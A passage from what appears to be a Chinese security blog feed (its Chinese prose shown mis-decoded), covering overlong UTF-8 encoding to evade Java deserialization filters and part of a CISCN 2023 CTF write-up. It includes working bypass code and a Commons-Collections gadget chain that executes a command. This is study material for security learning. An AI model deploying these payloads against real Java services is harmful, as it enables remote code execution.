class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeUTF</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡æµ‹è¯•"><a href="#ç»•è¿‡æµ‹è¯•" class="headerlink" title="ç»•è¿‡æµ‹è¯•"></a>ç»•è¿‡æµ‹è¯•</h2><p>è¿™é‡Œç›´æ¥æ‰“ä¸€ä¸ªæ™®é€šcc6çš„é“¾å­æ¥æµ‹è¯•æ˜¯å¦å¯ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.overlong;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.clown.Utils.CustomObjectOutputStream;<br><span class="hljs-keyword">import</span> org.clown.Utils.UTF8OutputStream;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//è¿™é‡Œå¾…ä¼šè°ƒç”¨çš„æ—¶å€™ä¼šåœ¨mpaæ–°å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br><span class="hljs-comment">//        serialize(hashMap);</span><br><span class="hljs-comment">//        serialize1(hashMap);</span><br><span class="hljs-comment">//        serialize2(hashMap);</span><br>        unserialize(<span class="hljs-string">&quot;ser2.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        CustomObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//æ­£å¸¸åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize1</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser1.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-comment">//é‡å†™writeUTFçš„åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize2</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        UTF8OutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UTF8OutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser2.bin&quot;</span>));<span class="hljs-comment">//ç”¨é‡å†™è¿‡çš„ObjectOutputStreamæ¥åºåˆ—åŒ–</span><br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å»çœ‹ä¸€ä¸‹ä½¿ç”¨å‰åå­—èŠ‚æµçš„å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/image-20241022221131584.png" alt="image-20241022221131584"></p><p><img src="https://cdn.clown2024.cn/image-20241022221119279.png" alt="image-20241022221119279"></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯æˆåŠŸå˜æˆä¸å¯è¯»çš„ç±»åäº†,ååºåˆ—åŒ–ä¹Ÿæ˜¯èƒ½æ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p><p><img src="https://cdn.clown2024.cn/image-20241022221255341.png" alt="image-20241022221255341"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/13932?accounttraceid=6f1030b220f8464eb2815f87796f4570daql&time__1311=eqRxyDcGG=k8D/D0D5IheGuDYwe=jDQwhD&alichlgref=https://account.aliyun.com/&u_atoken=569ca1e0aebe29a9b429829147e2aae3&u_asig=0a472f9217296064164077608e011c">javaåŸç”Ÿååºåˆ—åŒ–OverlongEncodingåˆ†æåŠå®æˆ˜ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg">UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰åªæ˜¯æµ…æµ…çš„çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œç°åœ¨æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨javaé¢˜ç›®ä¸­æœ‰æ—¶ä¼šç”¨åˆ°è¯¥æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡&lt;/p&gt;
&lt;h1 id=&quot;utf-8ç¼–ç è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#UTF-8ç¼–ç è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;UTF-8ç¼–ç è¿‡ç¨‹&quot;&gt;&lt;/a&gt;UTF-</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2023å›½èµ›DeserBugå¤ç°</title>
    <link href="https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/15/ciscn2023%E5%9B%BD%E8%B5%9BDeserBug%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-15T08:27:33.000Z</published>
    <updated>2024-10-26T08:15:55.801Z</updated>
    
    <content type="html"><![CDATA[<p>è™½è¯´é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç”±äºjavaé¢˜ç›®åšçš„è¿˜ä¸æ˜¯å¾ˆå¤šä¸å¤ªç†Ÿæ‚‰ï¼Œè€Œä¸”javaåŸºç¡€ä¸ç‰¢ï¼Œå¯¼è‡´ä¸€äº›ç‚¹è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><h1 id="deserbugé¢˜ç›®"><a href="#DeserBugé¢˜ç›®" class="headerlink" title="DeserBugé¢˜ç›®"></a>DeserBugé¢˜ç›®</h1><p>jadxåç¼–è¯‘æºç </p><p><img src="https://cdn.clown2024.cn/202410151633485.png" alt="image-20241015163331429"></p><p>Testappè¿™é‡Œï¼Œç›´æ¥æ ¹ç›®å½•ä¼ ä¸€ä¸ªbugstrå‚æ•°ï¼Œç„¶åå°†å†…å®¹base64è§£ç åååºåˆ—åŒ–</p><p>Myexpectæ˜¯ä¸€ä¸ªå¼‚å¸¸ç±»ï¼Œæ²¡çœ‹å‡ºæœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹</p><p>ç„¶åé¢˜ç›®é™„ä»¶è¿˜ç»™äº†ä¸¤ä¸ªåŒ…commons-collections-3.2.2.jarï¼Œhutool-all-5.8.18.jar</p><p><img src="https://cdn.clown2024.cn/202410151633951.png" alt="image-20241015163239379"></p><p>ç‰¹æ„ç»™äº†ä¸€ä¸ª3.2.2æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŒæŸ¥äº†ä¸€ä¸‹commons-collectionsä»3.2.2ç‰ˆæœ¬å¼€å§‹å°è¯•åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–InvokerTransformerç±»éƒ½ä¼šæŠ›å‡ºUnsupportedOperationExceptionå¼‚å¸¸</p><blockquote><p>ä¸”è¯¥ç‰ˆæœ¬åœ¨ä¸€äº›å±é™©çš„Transformerå®ç°ç±»çš„readObjectå‰åŠ ä¸Šäº†FunctorUtils#checkUnsafeSerializationæ¥æ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ã€‚</p></blockquote><p>ç„¶åæ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œå»çœ‹wpå½“æ—¶é¢˜ç›®è¿˜ç»™äº†ä¸¤ä¸ªæç¤º</p><blockquote><ol><li>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</li><li>jdk8u202(è¿™ä¸ªæœ¬åœ°æµ‹è¯•æ²¡ä»€ä¹ˆå½±å“)</li></ol></blockquote><p>æˆ‘å°±è¯´é‚£ä¸ªç‰¹åœ°å†™çš„Myexpectç±»æ€ä¹ˆä¼šæ²¡ç”¨ï¼ˆ</p><p>ä¼°è®¡è¿™ä¸­é—´å°±æ˜¯ç»™äº†ä¸€æ®µé“¾å­çš„æç¤ºä¸ç”¨è‡ªå·±æŒ–</p><p>æˆ‘ä»¬ç°åœ¨å°±æ ¹æ®æç¤ºå»çœ‹ä¸€ä¸‹ä»–çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ¬åœ°å·¥ç¨‹å¯¼å…¥ä»–ç»™çš„jaråŒ…æ¥çœ‹</p><p>çœ‹åˆ°com.app.Myexpect#getAnyexcept</p><p><img src="https://cdn.clown2024.cn/202410151634172.png" alt="image-20241015163448121"></p><p>è¿™é‡Œæœ‰ä¸ªnewInstanceï¼Œåº”è¯¥å°±æ˜¯æœ€åè¦æ‰§è¡Œçš„åœ°æ–¹ï¼Œå°±å¯ä»¥ç”¨åˆ°TemplatesImplçš„é“¾å­</p><p>emmm Hutoolæ²¡æ‰¾å‡ºæ¥åˆ©ç”¨é“¾ï¼Œæ‰“äº†ä¸ªcc3è¯•äº†ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410151635530.png" alt="image-20241015163503477"></p><p>InstantiateTransformerè¿™ä¸ªç±»ä¹Ÿç”¨ä¸äº†ï¼Œä¸ä¼šäº†çœ‹wpäº†</p><p>wpæ–‡ç« ï¼š<a href="https://blog.csdn.net/uuzeray/article/details/136748656">https://blog.csdn.net/uuzeray/article/details/136748656</a></p><p>çœ‹äº†ä¹‹åå‘ç°å…¶å®æ˜¯æœ‰ç‚¹åˆç†çŒœæµ‹çš„æ€è·¯åœ¨é‡Œé¢ï¼Œå¹¶æ²¡æœ‰å®Œå…¨è°ƒè¯•ï¼Œè¿™ä¹Ÿæ˜¯å’Œjavaçš„ç‰¹æ€§æœ‰å…³</p><p>å»çœ‹JSONObject</p><p><img src="https://cdn.clown2024.cn/202410151635818.png" alt="image-20241015163529771"></p><p>å¯ä»¥çŸ¥é“ä»–æ˜¯ä¸€ä¸ªmapï¼Œä»–çš„putæ–¹æ³•å°±ç›¸å½“äºæ˜¯map.put</p><p>é‚£putæ–¹æ³•åˆè¯¥æ€ä¹ˆæ ·è°ƒç”¨å‘¢ï¼Œæˆ‘ä»¬çš„lazyMap#getæ˜¯å¯ä»¥è°ƒç”¨putæ–¹æ³•çš„</p><p><img src="https://cdn.clown2024.cn/202410151635507.png" alt="image-20241015163539460"></p><p>å¦‚æœkeyä¸å­˜åœ¨ä»–å°±ä¼šè°ƒç”¨putæ–¹æ³•ï¼Œä»¤æˆ‘ä»¬çš„mapä¸ºJSONObjectå³å¯ï¼Œç„¶åJSONObjectå› ä¸ºæ˜¯mapï¼Œæˆ‘ä»¬å­˜å…¥çš„valueæ˜¯objectçš„è¯ï¼Œä»–å°±ä¼šéœ€è¦è·å–å¯¹è±¡ç›¸å…³å±æ€§ä¿¡æ¯ï¼Œé‚£æ€ä¹ˆè·å–ï¼Œåº”è¯¥å°±æ˜¯éœ€è¦é€šè¿‡getteræ–¹æ³•ï¼Œæ‰€ä»¥å°±è§¦å‘äº†æˆ‘ä»¬çš„getAnyexceptæ–¹æ³•</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥èµ°cc5çš„BadAttributeValueExpExceptioné‚£æ¡é“¾å­åˆ°lazyMap#getçš„é‚£éƒ¨åˆ†ï¼Œç„¶åå†æ‹¼ä¸ŠJSONObjectçš„é‚£éƒ¨åˆ†é“¾å­</p><p>æœ€ç»ˆé“¾å­å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject --&gt; TiedMapEntry#toString --&gt; LazyMap#get --&gt; JSONObject#put --&gt; Myexpect#getAnyexcept --&gt; è§¦å‘æ¶æ„ç±»<br></code></pre></td></tr></table></figure><h2 id="å¼€å§‹å‡ºé”™"><a 